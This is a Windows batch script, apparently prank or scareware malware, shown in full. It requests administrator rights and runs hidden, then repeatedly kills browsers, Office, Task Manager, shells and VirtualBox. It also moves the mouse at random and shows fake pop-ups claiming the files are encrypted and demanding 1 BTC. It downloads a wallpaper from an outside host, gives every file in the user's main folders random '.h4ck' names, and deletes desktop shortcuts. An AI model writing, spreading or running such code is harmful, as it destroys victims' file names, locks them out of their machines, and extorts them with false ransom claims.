@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
cd /d %~dp0
powershell -windowstyle hidden -command "Start-Process cmd -ArgumentList '/c %~nx0 & exit' -WindowStyle Hidden"

:killloop
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im write.exe >nul 2>&1
taskkill /f /im winword.exe >nul 2>&1
taskkill /f /im excel.exe >nul 2>&1
taskkill /f /im powerpnt.exe >nul 2>&1
taskkill /f /im outlook.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im brave.exe >nul 2>&1
taskkill /f /im discord.exe >nul 2>&1
taskkill /f /im steam.exe >nul 2>&1
taskkill /f /im steamwebhelper.exe >nul 2>&1
taskkill /f /im Spotify.exe >nul 2>&1
taskkill /f /im Code.exe >nul 2>&1
taskkill /f /im devenv.exe >nul 2>&1
taskkill /f /im git-bash.exe >nul 2>&1
taskkill /f /im VBoxSVC.exe >nul 2>&1
taskkill /f /im VirtualBox.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1
taskkill /f /im powershell.exe >nul 2>&1

:mouse
start /b powershell -command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point((Get-Random -Min 0 -Max 1920),(Get-Random -Min 0 -Max 1080)); Start-Sleep -Milliseconds 15}"

:popup
start /b powershell -command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.MessageBox]::Show('YOUR FILES ARE ENCRYPTED! SEND 1 BTC TO RECOVER','SYSTEM HIJACKED'); Start-Sleep -Seconds 2}"

:download
powershell -command "Invoke-WebRequest -Uri 'https://i.imgur.com/BjDp9XH.jpg' -OutFile '%temp%\hack.jpg'" >nul 2>&1

:wallpaper
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\hack.jpg" /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul 2>&1
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1

:infect
cd %userprofile%\desktop
for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
cd %userprofile%\documents
for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
cd %userprofile%\downloads
for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
cd %userprofile%\videos
for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
cd %userprofile%\music
for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
cd %userprofile%\pictures
for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
cd %userprofile%\desktop
for %%f in (*.lnk) do (del "%%f" 2>nul)
timeout /t 3 /nobreak >nul
goto killloop
